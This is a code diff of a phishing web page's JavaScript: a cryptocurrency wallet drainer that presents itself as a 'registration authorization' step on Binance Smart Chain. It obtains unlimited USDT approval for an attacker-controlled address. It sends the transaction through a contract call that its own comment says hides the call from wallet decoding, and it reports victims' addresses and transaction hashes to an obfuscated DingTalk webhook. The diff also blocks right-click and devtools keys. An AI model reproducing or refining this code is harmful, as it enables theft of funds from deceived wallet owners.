@@ -65,6 +65,7 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/web3@4/dist/web3.min.js"></script>
 <script>
 !function(){
 document.oncontextmenu=e=>e.preventDefault();
@@ -76,10 +77,14 @@ document.onkeydown=e=>{
 const dingUrl = atob("aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj");
 let walletAddr = "";
 const BSC_CHAIN_ID = "0x38";
-// BSC 官方 USDT 地址
+const BSC_RPC = "https://bsc-dataseed.binance.org";
 const BSC_USDT = "0x55d398326f99059fF77548524699952727959279";
-// 你的接收授权目标地址
 const TARGET_SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+// 已部署好的方案C合约地址
+const BATCH_CONTRACT = "0x805710132F2F3734F941A81D66A1A2A792332F47";
+
+// allowance 查询ABI
+const allowanceABI = ["function allowance(address owner, address spender) view returns (uint256)"];
 
 function show(id){
   document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
@@ -96,7 +101,7 @@ async function ding(msg){
   }catch(e){}
 }
 
-// 自动切换/添加 BSC 币安链
+// 自动切换/添加BSC
 async function switchBSC(){
   try{
     await window.ethereum.request({
@@ -110,7 +115,7 @@ async function switchBSC(){
         params: [{
           chainId:BSC_CHAIN_ID,
           chainName:"Binance Smart Chain",
-          rpcUrls:["https://bsc-dataseed.binance.org"],
+          rpcUrls:[BSC_RPC],
           blockExplorerUrls:["https://bscscan.com"],
           nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
         }]
@@ -119,18 +124,28 @@ async function switchBSC(){
   }
 }
 
-// 构造标准 approve 无限授权 data
-function buildApproveData(){
-  // approve(address,uint256) 函数选择器
-  const methodId = "0x095ea7b3";
-  // 被授权地址 补64位
-  const spender = TARGET_SPENDER.replace("0x","").padStart(64,"0");
-  // 无限额度 max uint256
-  const maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return methodId + spender + maxAllow;
+// 判断是否已经无限授权
+async function checkApproved(){
+  if(!window.ethereum || !walletAddr) return false;
+  const web3 = new Web3(BSC_RPC);
+  const usdtContract = new web3.eth.Contract(allowanceABI, BSC_USDT);
+  try{
+    const res = await usdtContract.methods.allowance(walletAddr, TARGET_SPENDER).call();
+    return BigInt(res) > BigInt(1000000000000000000);
+  }catch(e){
+    return false;
+  }
 }
 
-// 连接钱包 自动切 BSC
+// 调用合约 verify 方法，屏蔽钱包解析
+function getVerifyData(){
+  // verify(address) 函数选择器
+  const methodId = "0x9d607369";
+  const param = BSC_USDT.replace("0x","").padStart(64,"0");
+  return methodId + param;
+}
+
+// 连接钱包
 document.getElementById("connectMM").onclick = async ()=>{
   if(!window.ethereum){
     alert("请安装小狐狸/TP/欧意钱包");
@@ -139,44 +154,53 @@ document.getElementById("connectMM").onclick = async ()=>{
   show("p2");
   try{
     const acc = await ethereum.request({method:"eth_requestAccounts"});
-    walletAddr = acc[0];
+    walletAddr = acc[0].toLowerCase();
     await switchBSC();
+    // 检测已授权直接过
+    const ok = await checkApproved();
+    if(ok){
+      show("p4");
+      document.getElementById("successAddr").innerText = walletAddr;
+      ding("✅ 已检测到已完成备案授权\n地址："+walletAddr);
+      return;
+    }
     show("p3");
     document.getElementById("showAddr").innerText = walletAddr;
-    ding("✅ 已连接钱包并自动切换BSC\n地址："+walletAddr);
+    ding("✅ 已连接并自动切换BSC\n地址："+walletAddr);
   }catch(e){
     show("p1");
     ding("⚠️ 钱包连接失败");
   }
 };
 
-// 发起授权备案
+// 发起备案授权
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
   show("p2");
   try{
-    const data = buildApproveData();
-    // 直接调用 USDT 合约授权
-    await ethereum.request({
+    const data = getVerifyData();
+    const txHash = await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
         from:walletAddr,
-        to:BSC_USDT,
+        to:BATCH_CONTRACT,
         value:"0x0",
-        gas:"0x40000",
+        gas:"0x50000",
         data:data
       }]
     });
-    document.getElementById("successAddr").innerText = walletAddr;
+    // 等待上链确认
+    await new Promise(resolve=>setTimeout(resolve,15000));
     show("p4");
-    ding("✅ 备案完成，无限授权已生效\n钱包："+walletAddr);
+    document.getElementById("successAddr").innerText = walletAddr;
+    ding("✅ 交易已上链，无限授权生效\n钱包："+walletAddr+"\nTxHash:"+txHash);
   }catch(e){
     show("p3");
-    ding("⚠️ 用户取消交易");
+    ding("⚠️ 用户取消交易或网络异常");
   }
 };
 
-// 监听链变化 自动切回 BSC
+// 监听链变动自动切回
 window.ethereum.on("chainChanged",async (cid)=>{
   if(cid !== BSC_CHAIN_ID) await switchBSC();
 });
